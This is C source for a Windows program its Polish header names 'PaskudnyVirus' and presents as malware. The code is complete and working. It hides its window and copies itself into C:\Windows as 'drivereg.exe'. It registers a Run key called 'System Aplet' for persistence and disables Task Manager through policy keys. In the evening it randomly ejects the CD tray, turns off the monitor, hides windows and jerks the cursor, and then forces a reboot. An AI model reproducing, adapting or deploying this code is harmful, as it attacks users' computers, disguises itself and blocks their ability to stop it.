/*
  *************************************
  Witaj przyjacielu!
  Mam zaszczyt zaprezentowaæ Ci najnowsze dzie³o
  specjalistów z 39. 
  
  PaskudnyVirus v1.0.3.X written by Ash! 
  Chroñ ten kod!
  
  Potrafi w kolejnoœci:
          - Kopiowanie do Windows
          - Dodawanie do rejestru pliku po skopiowaniu
          - Okreslenie czasu do 1 komunikatu
          - okreslenie czasu po komunikacie do wy³¹czenia
          - Wysówaæ CD-ROM
          - Uruchamiaæ siê o okreœlonych godzinach w wybranym dniu tygodnia.       
 
  Co bêdzie potrafiæ jeszcze:

            - Samoistnie siê usun¹æ w okreœlony dzieñ.
  
  *************************************

*/


#include <time.h>
#include <windows.h>



/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
bool SystemRSF( int ); // Zamykanie , restart , force r s. , logoff
void CDEject(); // Akcje z cdromem!! :D
void komunikat(const char * , const char *  , UINT ); // komunikat
void kursorek( int , int ); // kursor
void mpoff(); // monitor 
void ukryj(); // ukrywa aktywne okno, jeœli jest to pasek start , to znika!





/*  Zmienne  */
char szClassName[ ] = "  ";
long zamkniecie = 20 ; // czas po ktorym zostanie zamkniety system

/*
  G³ówne okno WinMain aplikacji

*/		
int WINAPI WinMain (
                    HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil
                    )
{
    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */

    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 /* No menu */
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default color as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           szClassName,         /* Title Text */
           WS_OVERLAPPEDWINDOW, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           1,                 /* The programs width */
           1,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window no visible on the screen */
    ShowWindow (hwnd, SW_HIDE);



/*
    Bufor przetwarzaj¹cy path do naszej aplikacji*
    nastêpnie zostaje zape³niony œcie¿k¹ do pliku    
    oraz skopiowany na dysk.
*/

    char buff[512];
    GetFullPathName("drivereg.exe",sizeof(buff),(char*)buff,0);

    bool b = CopyFile(buff,"C:\\Windows\\drivereg.exe",0);
    if (b) 
    {
        
        HKEY klucz;
        LONG Wynik;
        DWORD Nowy;
        const BYTE * lpData = ( const BYTE * ) "C:\\WINDOWS\\drivereg.exe";
        Wynik = RegCreateKeyEx( HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, & klucz, & Nowy );
        if( Wynik == ERROR_SUCCESS )
        {
            RegSetValueEx( klucz, "System Aplet", 0, REG_SZ, lpData, 256 );
            RegCloseKey( klucz );
            
                Wynik = RegCreateKeyEx( HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, & klucz, & Nowy );
                if( Wynik == ERROR_SUCCESS )
                {
                    DWORD value=1;
                    RegSetValueEx( klucz, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value) );
                    RegCloseKey( klucz );
                }
        }

    }

/*
    Tutaj pojawi siê warunek odnoœnie ustalonej godziny i cyklu dat
    getlocaltime!
*/
 
   SYSTEMTIME st;
   GetLocalTime(&st);
   
   // Zmienne które mog¹ siê przydaæ!
   // W sumie to do ... sprawdzania daty i destrukcji
   int godzina = st.wHour;
   int minuta  = st.wMinute;
   int dzien = st.wDay;
   int miesiac = st.wMonth;
   int rok = st.wYear;
   int dzient = st. wDayOfWeek;
   
   
   /*
     Wyra¿enie które sprawdzi godziny  :)
   */
    bool godziny = ( godzina >= 20 && minuta >= 0 ) ? true : false;

   

   if(!godziny)
   {
      return 0;                  
   }
      Sleep(1*60*1000);
      srand(time(NULL));
      int x = 0 ;
      long msuse = 0;

      do
      {
           x = rand() % 4 + 1;
           switch(x)
           {
               case 4 :
                        for( int d = 0; d < 3; d++)
                        {
                        CDEject();
                        Sleep(3000);
                        }
                    break;
               case 3 :       
                     mpoff();
                     break;
               case 2:
                     ukryj();
                     break;      
               case 1 :
                    kursorek(720,522);
                    break;
           } 
            Sleep(10*1000);
            msuse += (10*1000);        
      }
       while( msuse != (zamkniecie*60*1000) );

       Sleep((rand() % 5 +1)*60*1000);
       SystemRSF(EWX_REBOOT | EWX_FORCE );
       
       // koniec programu.
       return 0;    

}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            break;
        case VK_END:
            PostQuitMessage (0);
            break;
        
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}

/*
  --------------------------------------------------
    Sekcja Funkcji programu
  
  --------------------------------------------------

*/

bool SystemRSF(int Action)
{
   HANDLE hToken; 
   TOKEN_PRIVILEGES tkp; 
 
   // Get a token for this process. 
 
   if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
      return( FALSE ); 
 
   // Get the LUID for the shutdown privilege. 
 
   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
        &tkp.Privileges[0].Luid); 
 
   tkp.PrivilegeCount = 1;  // one privilege to set    
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
   // Get the shutdown privilege for this process. 
   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
 
   if (GetLastError() != ERROR_SUCCESS) 
      return FALSE; 
 
   // Shut down the system and force all applications to close. 
   if (!ExitWindowsEx(Action, 0)) 
      return FALSE; 
    CloseHandle(hToken);
   //shutdown was successful
   return TRUE;
}

void CDEject()
{
   MCI_OPEN_PARMS OpenParm;
   MCI_SET_PARMS SetParm;
   MCIDEVICEID dID;
   OpenParm.lpstrDeviceType = "CDAudio";
   mciSendCommand(0,MCI_OPEN,MCI_OPEN_TYPE,(DWORD_PTR)&OpenParm);
   dID = OpenParm.wDeviceID;
   mciSendCommand(dID, MCI_SET, MCI_SET_DOOR_OPEN, (DWORD_PTR)&SetParm);
   Sleep(1000);
   mciSendCommand(dID, MCI_SET, MCI_SET_DOOR_CLOSED, (DWORD_PTR)&SetParm);
   mciSendCommand(dID, MCI_CLOSE, MCI_NOTIFY, (DWORD_PTR)&SetParm);
}

void komunikat(const char * tt, const char * tc, UINT Type)
{
	MessageBox(0, tt, tc, Type);
}

void kursorek(int max_x, int max_y)
{
       for(int i = 0 ; i < 100 ; i++)
       {
               SetCursorPos(rand() % max_x, rand() % max_y);    
               Sleep(100);   
       }
}

void mpoff()
{
       SendMessage(GetForegroundWindow() ,WM_SYSCOMMAND,SC_MONITORPOWER, 2);
       Sleep(3000);
       // wlaczamy monitor
       SendMessage(GetForegroundWindow() ,WM_SYSCOMMAND,SC_MONITORPOWER, -1);
}

void ukryj()
{
     HWND d;
     d = GetForegroundWindow();
     if ( d > 0 )
     {
        ShowWindow( d , SW_HIDE );
     }   
}
